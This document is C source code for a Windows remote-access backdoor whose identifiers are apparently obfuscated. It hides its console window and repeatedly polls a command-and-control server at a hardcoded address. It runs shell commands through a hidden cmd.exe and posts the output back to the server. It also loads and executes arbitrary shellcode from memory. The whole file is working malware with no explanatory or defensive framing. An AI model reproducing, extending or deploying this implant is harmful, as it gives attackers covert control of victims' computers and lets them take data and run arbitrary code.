#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#pragma comment(lib, "wininet.lib")

#define A L"192.168.1.230"
#define B 5706
#define C L"/command.txt"
#define D 30000

char* E() {
    char a[64],b[128],c[512];
    WideCharToMultiByte(CP_ACP,0,A,-1,a,64,0,0);
    WideCharToMultiByte(CP_ACP,0,C,-1,b,128,0,0);
    snprintf(c,512,"http://%s:%d%s",a,B,b);
    HINTERNET d=InternetOpenA("Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
    if(!d) return 0;
    HINTERNET e=InternetOpenUrlA(d,c,0,0,INTERNET_FLAG_RELOAD,0);
    if(!e){InternetCloseHandle(d);return 0;}
    char f[4096]={0},g[4096];
    DWORD h=0,j=0;
    while(InternetReadFile(e,g,4095,&h)&&h>0){
        g[h]=0;
        if(j+h<4095){memcpy(f+j,g,h);j+=h;}
        else break;
    }
    f[j]=0;
    InternetCloseHandle(e);
    InternetCloseHandle(d);
    char*k=f+strlen(f)-1;
    while(k>f&&(*k=='\n'||*k=='\r'||*k==' '))*k--=0;
    return _strdup(f);
}

void F(const char*s){
    SECURITY_ATTRIBUTES a={sizeof(a),0,1};
    HANDLE b,c;
    if(!CreatePipe(&b,&c,&a,0))return;
    STARTUPINFOA d={sizeof(d)};
    d.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    d.wShowWindow=SW_HIDE;
    d.hStdOutput=c;
    d.hStdError=c;
    char e[4096];
    snprintf(e,4096,"cmd.exe /c %s",s);
    PROCESS_INFORMATION f;
    if(!CreateProcessA(0,e,0,0,1,CREATE_NO_WINDOW,0,0,&d,&f)){
        CloseHandle(c);CloseHandle(b);return;
    }
    WaitForSingleObject(f.hProcess,15000);
    CloseHandle(f.hProcess);
    CloseHandle(f.hThread);
    CloseHandle(c);
    char g[8192]={0};
    DWORD h;
    if(ReadFile(b,g,8191,&h,0)){
        g[h]=0;
        char i[64],j[16384]={0},k[32768];
        size_t l=0;
        for(const char*m=g;*m&&l<16381;m++){
            if(isalnum((unsigned char)*m)||*m=='-'||*m=='_'||*m=='.'||*m=='~')j[l++]=*m;
            else if(*m==' ')j[l++]='+';
            else{snprintf(j+l,4,"%%%02X",(unsigned char)*m);l+=3;}
        }
        j[l]=0;
        WideCharToMultiByte(CP_ACP,0,A,-1,i,64,0,0);
        snprintf(k,32768,"data=%s",j);
        HINTERNET n=InternetOpenA("Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
        if(n){
            HINTERNET o=InternetConnectA(n,i,B,0,0,INTERNET_SERVICE_HTTP,0,0);
            if(o){
                HINTERNET p=HttpOpenRequestA(o,"POST","/result.txt",0,0,0,0,0);
                if(p){
                    HttpSendRequestA(p,"Content-Type: application/x-www-form-urlencoded",-1,k,strlen(k));
                    InternetCloseHandle(p);
                }
                InternetCloseHandle(o);
            }
            InternetCloseHandle(n);
        }
    }
    CloseHandle(b);
}

void G(const char*h){
    size_t a=strlen(h),b=a/2+1;
    unsigned char*c=(unsigned char*)malloc(b);
    if(!c)return;
    size_t d=0;
    for(size_t e=0;e<a;e++){
        if(h[e]=='\\'||h[e]=='x'||h[e]==' '||h[e]==',')continue;
        if(isxdigit((unsigned char)h[e])&&e+1<a&&isxdigit((unsigned char)h[e+1])){
            char f[3]={h[e],h[e+1],0};
            c[d++]=(unsigned char)strtol(f,0,16);
            e++;
        }
    }
    if(!d){free(c);return;}
    LPVOID g=VirtualAlloc(0,d,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(g){memcpy(g,c,d);DWORD i;VirtualProtect(g,d,PAGE_EXECUTE_READ,&i);((void(*)())g)();VirtualFree(g,0,MEM_RELEASE);}
    free(c);
}

int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d){
    HWND e=GetConsoleWindow();
    if(e)ShowWindow(e,SW_HIDE);
    HANDLE f=CreateMutexW(0,0,L"Global\\S2M");
    if(GetLastError()==ERROR_ALREADY_EXISTS){CloseHandle(f);return 0;}
    while(1){
        char*g=E();
        if(g){
            if(strcmp(g,"none")==0);
            else if(strncmp(g,"shell ",6)==0){
                const char*h=g+6;
                if(*h=='\''||*h=='"')h++;
                char*i=_strdup(h);
                size_t j=strlen(i);
                if(j>0&&(i[j-1]=='\''||i[j-1]=='"'))i[j-1]=0;
                F(i);
                free(i);
            }
            else if(strncmp(g,"shellcode ",10)==0){
                const char*h=g+10;
                if(*h=='\''||*h=='"')h++;
                char*i=_strdup(h);
                size_t j=strlen(i);
                if(j>0&&(i[j-1]=='\''||i[j-1]=='"'))i[j-1]=0;
                G(i);
                free(i);
            }
            free(g);
        }
        Sleep(D);
    }
    CloseHandle(f);
    return 0;
}